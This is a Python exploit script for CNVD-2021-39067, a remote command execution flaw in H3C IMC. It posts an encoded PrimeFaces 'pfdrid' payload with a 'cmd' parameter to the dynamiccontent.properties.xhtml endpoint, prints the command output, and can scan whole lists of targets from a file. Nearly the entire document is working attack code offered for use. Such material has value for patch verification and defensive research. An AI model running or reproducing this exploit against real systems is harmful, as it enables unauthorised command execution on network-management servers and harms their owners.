import requests
import argparse
import urllib3
import sys
import json

urllib3.disable_warnings()


def title():
    print("""
                               H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行_CNVD-2021-39067漏洞
                      use: python3  H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行_CNVD-2021-39067.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        url = self.url + "/imc/javax.faces.resource/dynamiccontent.properties.xhtml"
        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        payload = {"pfdrt": "sc", "ln": "primefaces",
                   "pfdrid": "uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV/KAe9gtw54DSQCl72JjEAsHTRvxAuJC+/IFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf/cNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv+Eo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c+GvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy+ZLezLj6vK+pVFyKR7s8xN5Ol1tz/G0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM/cwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16/I7eog15OBl4Kco/VjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH+N7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO+Eb/60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF/ciVuZGssKeVT/gR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx/qFUj+DikXHLvbUMrMlNAqSFJpqoy/QywVdBmlVdx+vJelZEK+BwNF9J4p/1fQ8wJZL2LB9SnqxAKr5kdCs0H/vouGHAXJZ+Jzx5gcCw5h6/p3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D/ukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd+LylDFB3dcYIgZtZoaSMAV3pyNoOzHy+1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3+9h0aurkyJVR28jIQlF4nT0nZqpixP/nc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl+zoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH+OwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE+lsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU=",
                   "cmd": "whoami"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
        }
        try:
            requests.packages.urllib3.disable_warnings()
            r = requests.request("post", url, headers=headers, verify=False, proxies=proxies, timeout=1, data=payload)
            sys = r.text
            if "sys" in sys and r.status_code == 200:
                print(
                    "\033[32m[o]" + self.url + "存在H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行漏洞！漏洞定位："+r.url+" 命令回显信息："+sys+"\033[0m")
                # with open("H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行_CNVD-2021-39067漏洞结果.txt", mode="a") as rp:
                #     rp.write(self.url + " 漏洞定位:" + r.url + "\n")
            else:
                print(self.url + "不存在H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行_CNVD-2021-39067漏洞！")
        except:
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行_CNVD-2021-39067漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行_CNVD-2021-39067.py -u http://127.0.0.1\neg2:>>>python3 H3C_IMC_dynamiccontent_properties_xhtm_远程命令执行_CNVD-2021-39067.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
